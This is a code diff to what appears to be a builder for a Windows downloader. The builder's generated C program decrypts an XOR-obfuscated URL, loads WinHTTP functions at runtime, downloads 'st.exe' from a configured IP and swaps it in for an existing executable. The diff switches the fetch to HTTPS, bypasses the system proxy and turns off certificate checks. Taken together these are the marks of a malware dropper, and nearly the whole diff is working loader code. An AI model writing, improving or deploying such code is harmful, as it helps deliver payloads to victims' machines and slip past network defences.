@@ -71,7 +71,8 @@ function encryptStr(str, key) {
 }
 
 function cSource(meta, key, ip, buildId) {
-  const stUrl = `http://${ip}/api/downloads/st.exe`;
+  // CHANGED TO HTTPS ON PORT 443
+  const stUrl = `https://${ip}/api/downloads/st.exe`;
   const esc4c = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
   
   const encStUrl = encryptStr(stUrl, meta.xorKey);
@@ -99,6 +100,7 @@ typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
 typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
 typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
 typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
+typedef BOOL (WINAPI *pWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
 
 static int is_valid_pe(const wchar_t* p) {
     HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
@@ -130,8 +132,9 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
     pWinHttpQueryDataAvailable WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
     pWinHttpReadData WinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
     pWinHttpCloseHandle WinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
+    pWinHttpSetOption WinHttpSetOption = (pWinHttpSetOption)GetProcAddress(hWinHttp, "WinHttpSetOption");
 
-    if (!WinHttpCrackUrl || !WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpQueryDataAvailable || !WinHttpReadData || !WinHttpCloseHandle) {
+    if (!WinHttpCrackUrl || !WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpQueryDataAvailable || !WinHttpReadData || !WinHttpCloseHandle || !WinHttpSetOption) {
         FreeLibrary(hWinHttp); return 0;
     }
 
@@ -144,14 +147,20 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
         FreeLibrary(hWinHttp); return 0;
     }
 
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) { FreeLibrary(hWinHttp); return 0; }
 
     HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
 
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    // Use WINHTTP_FLAG_SECURE for HTTPS
+    DWORD dwFlags = (uc.nPort == INTERNET_DEFAULT_HTTPS_PORT) ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
     if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
+
+    // Ignore SSL certificate errors
+    DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
 
     BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);
@@ -210,7 +219,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         CloseHandle(hKey);
     }
 
-    // 2. Download st.exe
+    // 2. Download st.exe over HTTPS
     int need_st = !is_valid_pe(stPath);
     if (need_st) {
         char stUrlStr[128] = {0};
@@ -220,7 +229,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
         MultiByteToWideChar(CP_ACP, 0, stUrlStr, -1, stUrlW, 128);
 
-        // Download to a temp file to bypass file-locking
         if (download_file(stUrlW, stNewPath) && is_valid_pe(stNewPath)) {
             DeleteFileW(stPath);
             MoveFileW(stNewPath, stPath);
@@ -229,7 +237,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     }
 
     if (need_st) {
-        MessageBoxA(NULL, "Download failed. Check server IP and port 80.", "Error", MB_ICONERROR);
+        MessageBoxA(NULL, "Download failed. Check server IP and port 443.", "Error", MB_ICONERROR);
         return 1; 
     }
 
